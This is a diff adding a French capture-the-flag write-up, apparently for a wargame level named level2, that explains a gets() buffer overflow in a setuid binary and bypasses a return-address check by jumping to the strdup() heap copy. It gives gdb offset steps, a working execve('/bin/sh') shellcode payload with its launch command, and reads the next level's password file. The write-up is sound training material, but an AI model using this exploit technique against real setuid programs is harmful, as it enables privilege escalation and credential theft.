@@ -1,0 +1,42 @@
+Le binaire level2 possede les droits setuid de level3. La fonction p() (appele depuis main) lit l'entrer standard avec gets(), qui ne verife jamais la taille de ce qui est ecrit dans son buffer.
+On peut donc faire overflow ce buffer pour ecraser l'adresse de retour de p().
+
+Une protection est presente: juste apres gets(), le programmme verifie que l'adresse de retour ne commence pas par "0xb", ce qui bloque toute tentative de retour vers la stack, la libc ou ld.so -> ces 3 zones etant mappees a des adresses commencant par "0xb" sur ce systeme. Si le test echoue le porgramme affiche l'adresse puis quitte.
+
+Cependant apres ce test la fonction strdup() est appeler, elle copier le contenue de buffer sur la heap a une adresse fix. qui commence par 0x08 donc une adresse qui passe le test de securite et qui n'est pas protege ene excution contrairement a la stack.
+
+La start est donc de placer un shellcode (execve("/bin/sh")) au tout debut du buffer, laisser strdup() le copier sur la heap puis ecraser l'adresse de retour de p() avec l'adresse de cette copie sur la heap pour que le programme l'execute.
+
+Le buffer commence a "ebp-0x4c" et l'adresse de retour a "ebp+0x4", soit 80 octet de remplissage avant de l'atteindre.
+Check gdb -> info frame.
+
+-Calcule offset overflow:
+run gdb avec :
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Puis calcule de l'offset:
+python3 -c "
+import struct
+pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9'
+val = struct.pack('<I', $adress)
+print(pattern.find(val.decode()))
+"
+
+- Recuperation de l'adresse renvoyee par strdup() (adresse heap) :
+ltrace ./level2
+
+Comme l'adresse exact sur la heap depend de l'execution on la recupere sous gdb -> breakpoint juste apres call strdup@plt -> print/x $eax donne l'adrese renvoyee par strdup() (ici 0x0804a008).
+
+Payload dans le tmp:
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/exploit
+cat /tmp/exploit - | ./level2
+
+Le payload contient 21 octet de shellcode , 59 octet de remplissage (21 + 59 = 80 de l'offset calcule avant)
+(le - dans dans la commande de lancement garde l'entree standard ouverte pares le payload pour taper deans le shell)
+
+Une fois dans le shell:
+whoami
+-> level3
+
+Recup flag
+cat /home/user/level3/.pass
